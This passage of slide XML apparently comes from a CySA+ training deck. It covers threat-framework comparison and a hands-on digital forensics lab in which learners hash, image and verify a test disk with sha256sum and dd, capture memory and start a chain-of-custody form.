              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Fill in the four corners of the diamond:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Rectangle 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ ┌────────────┐</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730</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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20 — Hands-On Steps (cont'd)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21534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1534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05840" y="263118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2631186"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="9509760" cy="2153412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Compare frameworks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>CySA+ expects you to know what each framework is for — pick the right one for the audience.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4064508"/>
            <a:ext cx="10634472" cy="21534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064508"/>
            <a:ext cx="91440" cy="21534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05840" y="4912614"/>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05840" y="4912614"/>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6" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4064508"/>
            <a:ext cx="5486400" cy="2153412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Save artefacts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>These artefacts feed into the incident report deliverable (Lab 27).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4866894"/>
            <a:ext cx="3977639" cy="5486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52360" y="4866894"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ mkdir -p /tmp/lab20</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731</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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20 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Walk a realistic intrusion through the 7-stage Cyber Kill Chain.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Build an ATT&amp;CK Navigator layer by mapping each scenario step to a technique ID.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Apply the Diamond Model to enumerate pivot opportunities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Choose the right framework for the analytic question at hand.</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732</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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21 — Evidence Acquisition and Chain of Custody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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will perform a forensically sound image of a "compromised" disk and memory, generate hashes, fill in a chain-of-custody form, and verify integrity. This maps to CySA+ 3.2 (Evidence acquisitions — Chain of custody, Validating data integrity, Preservation, Legal hold).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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733</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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21 — Reference Diagram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g_c9d66737d4.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2821485"/>
            <a:ext cx="3361944" cy="2358030"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_fff1869550.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4413504" y="3021293"/>
            <a:ext cx="3361944" cy="1958413"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8" descr="img_a056dc1946.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8049768" y="3051748"/>
            <a:ext cx="3361944" cy="1897503"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>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734</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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21 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Why order matters: order of volatility</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Before touching the system, recall the volatility ladder (most-to-least volatile):</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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695651"/>
            <a:ext cx="91440" cy="78455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05840" y="285932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05840" y="2859328"/>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6" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Create a controlled "evidence" target</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>You now have an 8 MB "disk" with two artefacts.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ mkdir -p /tmp/evidence /tmp/case_001</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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240" y="3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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3" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Hash the source BEFORE imaging (preservation)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Both hashes are recorded — MD5 for legacy compatibility, SHA-256 for cryptographic strength.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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452360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ sha256sum /tmp/evidence/suspect.img | tee /tmp/case_001/source.sha256</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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005840" y="468447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05840" y="4684470"/>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30" name="TextBox 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Make a bit-for-bit image (acquisition)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Real engagements use a hardware write-blocker plus dcfldd or dc3dd (FTK Imager on Windows) — they hash on-the-fly and log every read error.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Rectangle 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ dd if=/tmp/evidence/suspect.img of=/tmp/case_001/image.dd bs=1M status=p</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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777240" y="5433364"/>
            <a:ext cx="91440" cy="78455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1005840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="TextBox 36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Verify integrity (validating data integrity)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>If the hashes match, the image is admissible.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Rectangle 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ sha256sum /tmp/case_001/image.dd | tee /tmp/case_001/image.sha256</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 3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41" name="TextBox 4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2" name="TextBox 4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735</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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21 — Hands-On Steps (cont'd)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01269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01269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05840" y="2060829"/>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2060829"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Capture volatile memory (memory acquisition)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>In Linux the standard free tools are:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2015109"/>
            <a:ext cx="3977639" cy="5486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52360" y="2015109"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt install -y avml 2&gt;/dev/null || echo "avml may need manual install"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2923794"/>
            <a:ext cx="10634472" cy="101269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2923794"/>
            <a:ext cx="91440" cy="101269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005840" y="3201543"/>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3201543"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2923794"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Build the chain-of-custody form</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Every transfer of the evidence (analyst → locker → court) gets a new row.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3155823"/>
            <a:ext cx="3977639" cy="5486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52360" y="3155823"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cat &gt; /tmp/case_001/chain_of_custody.md &lt;&lt;EOF</a:t>
